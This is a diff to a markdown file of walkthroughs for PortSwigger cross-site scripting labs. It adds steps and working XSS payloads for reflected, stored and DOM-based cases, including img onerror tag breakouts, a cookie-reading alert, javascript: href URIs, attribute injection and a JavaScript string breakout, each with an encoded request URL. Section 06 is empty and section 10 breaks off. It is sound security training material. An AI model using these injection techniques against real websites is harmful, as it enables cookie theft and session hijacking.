@@ -65,9 +65,9 @@ The steps used to perform can be reached below (sequence).
 To solve this lab, perform a cross-site scripting attack that <b>calls the alert function</b>.
 
 The steps used to perform can be reached below (sequence).
-1. https://0aec00df044a71a88021b26400270068.web-security-academy.net/
-2. https://0aec00df044a71a88021b26400270068.web-security-academy.net/?search=a
-3. Our input wraped on <code>span</code> tag, let's try to use <code>```</span><img src=a onerror=alert(1)>```</code> (https://0aec00df044a71a88021b26400270068.web-security-academy.net/?search=%3C%2Fspan%3E%3Cimg+src%3Da+onerror%3Dalert%281%29%3E), it worked.
+1. https://0af600d803764fa58046039d0009000e.web-security-academy.net/
+2. https://0af600d803764fa58046039d0009000e.web-security-academy.net/?search=a
+3. Our input wraped on <code>span</code> tag, let's try to use <code>```</span><img src=a onerror=alert(1)>```</code> (https://0af600d803764fa58046039d0009000e.web-security-academy.net/?search=%3C%2Fspan%3E%3Cimg+src%3Da+onerror%3Dalert%281%29%3E), it worked.
 
 <br></br>
 
@@ -83,3 +83,72 @@ The steps used to perform can be reached below (sequence).
 3. Since on the previous page the form not returned our input, then we can change for other page such as https://0aba009c03f064e2822a42c900d60015.web-security-academy.net/post?postId=3. 
 4. After try to submit the form, our input showed on the page and wraped by paragraph tag, we can try to escape it by using <code>```></p><img src=a onerror=alert(document.cookie)>```</code> on the comment section, and fill the rest to perform attack. However, still nothing, now let's back to the feedback page and inspect it to gain informations.
 5. After inspecting, we can see there is script that grab the link and set it to return path, so we can try to change the URL from <code>/</code> to <code>javascript:alert(document.cookie)</code>. This because they're using href, so we can execute this script.
+
+<br></br>
+
+# 06. DOM XSS in jQuery selector sink using a hashchange event
+#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
+<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.
+
+To solve the lab, deliver an exploit to the victim that <b>calls the print() function in their browser</b>.
+
+The steps used to perform can be reached below (sequence).
+
+<br></br>
+
+# 07. Reflected XSS into attribute with angle brackets HTML-encoded
+#### Lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
+<b>Problem:</b> This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. 
+
+To solve this lab, perform a cross-site scripting attack that injects an attribute and <b>calls the alert function</b>.
+
+The steps used to perform can be reached below (sequence).
+1. https://0a23003c046bfcfee5c3af2100ed006c.web-security-academy.net/
+2. https://0a23003c046bfcfee5c3af2100ed006c.web-security-academy.net/?search=a
+3. We can try to see if our input get sanitized by using simple script <code>```'</h1><img src=a onerror=alert(1)>```</code> (https://0a23003c046bfcfee5c3af2100ed006c.web-security-academy.net/?search=%27%3C%2Fh1%3E%3Cimg+src%3Da+onerror%3Dalert%281%29%3E). The result is, web can handle this script so, it's sanitized.
+4. Let's try another script by replace the open-close tag by <code>```&lt; ``` for < and ```&gt;``` for ></code>(https://0a23003c046bfcfee5c3af2100ed006c.web-security-academy.net/?search=%27%26lt%3B%2Fh1%26gt%3B%26lt%3Bimg+src%3Da+onerror%3Dalert%281%29%26gt%3B). Unfortunately it doesn't work.
+5. After inspecting the page, we can see that our input goes to "value" on the form input, we may attack it by close the <code>"</code> and close tag. Also, since there is sanitation, we're unable to add script such as img, script, then we shall use another thing like <code>"onmouseover="javascript:alert('XSS');"</code> (https://0a23003c046bfcfee5c3af2100ed006c.web-security-academy.net/?search=%22onmouseover%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22).
+
+<br></br>
+
+# 08. Stored XSS into anchor href attribute with double quotes HTML-encoded
+#### Lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
+<b>Problem:</b> This lab contains a stored cross-site scripting vulnerability in the comment functionality. 
+
+To solve this lab, submit a comment that <b>calls the alert function when the comment author name is clicked</b>.
+
+The steps used to perform can be reached below (sequence).
+1. https://0af4001a03c1c4e680f40375000700e5.web-security-academy.net/
+2. https://0af4001a03c1c4e680f40375000700e5.web-security-academy.net/post?postId=7
+3. Since on this page has comments which means there might be a vulnerability on the form. We can try to write "something" on the form. Our comment placed on the page and inside of paragraph tag, we can try to escape it by closing the paragraph tag. <code>```</p><img src=a onerror=alert(1)>```</code>. After submit, this script won't work because of sanitation.
+4. We can start inspect and find another things. We can see our website is on <code>href</code>, we can add double-quote to close the href and close tag to escape. <code>```javascript:alert(1)```</code> on website input, because our website put inside of href. (https://0af4001a03c1c4e680f40375000700e5.web-security-academy.net/post/comment/confirmation?postId=7).
+
+<br></br>
+
+# 09. Reflected XSS into a JavaScript string with angle brackets HTML encoded
+#### Lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
+<b>Problem:</b> This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. 
+
+To solve this lab, perform a cross-site scripting attack that <b>breaks out of the JavaScript string and calls the alert function</b>.
+
+The steps used to perform can be reached below (sequence).
+1. https://0a97008b0338a44681e5117100fa0089.web-security-academy.net/
+2. https://0a97008b0338a44681e5117100fa0089.web-security-academy.net/?search=a
+3. Based on previous lessons, we can inspect and our input on search bar placed not only on h1 tag but also the img tag resource, let's try to escape it by double-quote and create script <code>```';alert(1); let a='a```</code> because the script are 
+<code> var searchTerms = '';alert(1); let a='a';
+  ```document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');```
+</code>
+We can try to escape and use this script to exploit it.
+
+<br></br>
+
+# 10. DOM XSS in document.write sink using source location.search inside a select element
+#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
+<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.
+
+To solve this lab, perform a cross-site scripting attack that <b>breaks out of the select element and calls the alert function</b>.
+
+The steps used to perform can be reached below (sequence).
+1. https://0a3e00fc0496905c80a2765200910078.web-security-academy.net/
+2. https://0a3e00fc0496905c80a2765200910078.web-security-academy.net/product?productId=1
+3. 
